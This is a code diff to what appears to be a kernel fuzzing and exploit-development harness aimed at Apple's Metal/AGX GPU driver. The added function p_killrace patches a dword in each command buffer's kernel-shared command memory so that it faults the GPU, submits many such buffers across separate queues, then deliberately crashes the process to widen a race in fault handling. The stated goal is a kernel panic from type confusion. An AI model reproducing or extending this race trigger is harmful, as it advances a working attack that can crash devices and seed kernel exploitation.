@@ -15591,6 +15591,112 @@ static void p_mtlmutc(void) {
         cn, done, stop ? " STOPPED-EARLY" : "");
 }
 
+// V115: p_killrace — widen the restartWorkQueue / getGuiltyChannel race.
+// p_mtlmut case #929: a blit cb with kcmd+0x150 patched 0x268 -> 0xffffffff
+// deterministically faults the GPU and kills the app (2/2 repro). Static
+// analysis (docs/iogpu_restart_policy.md) shows fault handling walks
+// channels via getGuiltyChannel and panics on type confusion ("invalid
+// AGXChannel") when the guilty channel is mid-teardown. This phase
+// multiplies queues (separate channels) and faults them all at once, then
+// dies instantly — deliberate SIGSEGV via null deref, not SIGKILL, so death
+// cannot get stuck behind a wedged syscall — so the fault lands while many
+// channel objects are being torn down simultaneously. Expected outcome: the
+// process dies (normal). Outcome of interest: the DEVICE state — panic vs
+// silence (panic = race won).
+// Env: FUZZ_KILLRACE_QUEUES (def 8), FUZZ_KILLRACE_ROUNDS (def 50),
+// FUZZ_KILLRACE_WAIT_MS (def 0 — sweep 0/5/20/100 between commit and death).
+static void p_killrace(void) {
+    long nq = atol(getenv("FUZZ_KILLRACE_QUEUES") ?: "8");
+    long rounds = atol(getenv("FUZZ_KILLRACE_ROUNDS") ?: "50");
+    long waitms = atol(getenv("FUZZ_KILLRACE_WAIT_MS") ?: "0");
+    if (nq < 1) nq = 1;
+    if (nq > 32) nq = 32;
+    LOG("[krc] v115 kill-race: %ld queues, %ld rounds, wait %ld ms", nq, rounds, waitms);
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    if (!dev) { LOG("[krc] no device"); return; }
+    id<MTLBuffer> bufA = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+    id<MTLBuffer> bufB = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+    if (!bufA || !bufB) { LOG("[krc] alloc fail"); return; }
+    memset([bufA contents], 0x41, 0x10000);
+    memset([bufB contents], 0, 0x10000);
+    uint64_t gpuA = [bufA gpuAddress];
+    uint64_t gpuB = [bufB gpuAddress];
+    g_srcx = gpuA ^ 0x5a5a5a5a5a5a5a5aULL;   // xor-masked slot-patcher targets
+    g_dstx = gpuB ^ 0x5a5a5a5a5a5a5a5aULL;
+    LOG("[krc] gpuA 0x%llx gpuB 0x%llx", gpuA, gpuB);
+    // N separate queues — separate channels: one fault tears down N channel
+    // objects at the same time
+    NSMutableArray *queues = [NSMutableArray arrayWithCapacity:(NSUInteger)nq];
+    for (long i = 0; i < nq; i++) {
+        id<MTLCommandQueue> q = [dev newCommandQueue];
+        if (q) [queues addObject:q];
+    }
+    LOG("[krc] %lu queues live", (unsigned long)[queues count]);
+    if (![queues count]) return;
+
+    for (long r = 1; r <= rounds; r++) {
+        @autoreleasepool {
+            NSMutableArray *cbs = [NSMutableArray arrayWithCapacity:[queues count]];
+            long patched = 0;
+            for (id<MTLCommandQueue> q in queues) {
+                id<MTLCommandBuffer> cb = [q commandBuffer];
+                id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+                [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB
+                    destinationOffset:0 size:0x10000];
+                [enc endEncoding];
+                void *st = find_ivar_obj(cb, "torage", 0, "cb");
+                uint64_t kva = st ? *(uint64_t *)((uint8_t *)st + 0x28) : 0;
+                if (!kva) { LOG("[krc] r%ld: no kcmd ptr, cb unpatched", r); }
+                else {
+                    uint32_t *dw150 = (uint32_t *)((uint8_t *)(uintptr_t)kva + 0x150);
+                    if (*dw150 != 0x268) {
+                        LOG("[krc] r%ld: kcmd+0x150 = 0x%08x (want 0x268) — "
+                            "layout drift, cb unpatched", r, *dw150);
+                    } else {
+                        *dw150 = 0xffffffff;   // the #929 killer dword
+                        patched++;
+                    }
+                }
+                [cb commit];   // no waiting — all N in flight together
+                [cbs addObject:cb];
+            }
+            LOG("[krc] round %ld: %lu killer cbs committed (%ld patched "
+                "0x268->ffffffff), dying in %ld ms", r, (unsigned long)[cbs count],
+                patched, waitms);
+            fsync(fileno(stderr));
+            if (waitms > 0) usleep((useconds_t)(waitms * 1000));
+            if (![cbs count]) { LOG("[krc] round %ld: nothing committed, next", r); continue; }
+            // non-blocking status poll, 100 ms total budget: did the fault
+            // fire, are we already being torn down?
+            long pend = 0, err = 0, ok = 0;
+            for (int w = 0; w < 100; w++) {
+                pend = err = ok = 0;
+                for (id<MTLCommandBuffer> cb in cbs) {
+                    long cs = (long)[cb status];
+                    if (cs >= 4) { if (cs == 4) ok++; else err++; }
+                    else pend++;
+                }
+                if (!pend) break;
+                usleep((useconds_t)1000);
+            }
+            if (!pend && !err) {
+                // clean: the fault misfired this round — log, move on
+                LOG("[krc] round %ld: %ld cbs completed clean — fault misfired, next round",
+                    r, ok);
+                continue;
+            }
+            // fault fired (or a channel wedged mid-teardown): die HARD now,
+            // while the channels are being torn down — this is the race
+            // window for getGuiltyChannel type confusion
+            LOG("[krc] round %ld: fault sign (pend %ld err %ld ok %ld) — "
+                "deliberate SIGSEGV now", r, pend, err, ok);
+            fsync(fileno(stderr));
+            *(volatile char *)0 = 42;   // instant SIGSEGV; wedged-proof by design
+        }
+    }
+    LOG("[krc] survived all %ld rounds (alive)", rounds);
+}
+
 // V92: pinned-GPUAddress resources (new_resource format B with pinned fields).
 // variant 0 = task spec: +0x30 u64 pinned addr, +0x38 u64 size (base fields as
 // in the traced plain alloc); variant 1 = the pinned record from the macOS
@@ -19963,6 +20069,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_MTPATCH")) { p_mtpatch(); LOG("[probe13] mtpatch-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MTLMUT")) { p_mtlmut(); LOG("[probe13] mtlmut-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MTLMUTC")) { p_mtlmutc(); LOG("[probe13] mtlmutc-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_KILLRACE")) { p_killrace(); LOG("[probe13] killrace-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MTLTRACE")) { p_mtltrace(); LOG("[probe13] mtltrace-only mode, stop"); return NULL; }
         if (getenv("FUZZ_CONNPROBE")) { p_connprobe(); LOG("[probe13] connprobe-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MTLSELF")) { p_mtlself(); LOG("[probe13] mtlself-only mode, stop"); return NULL; }
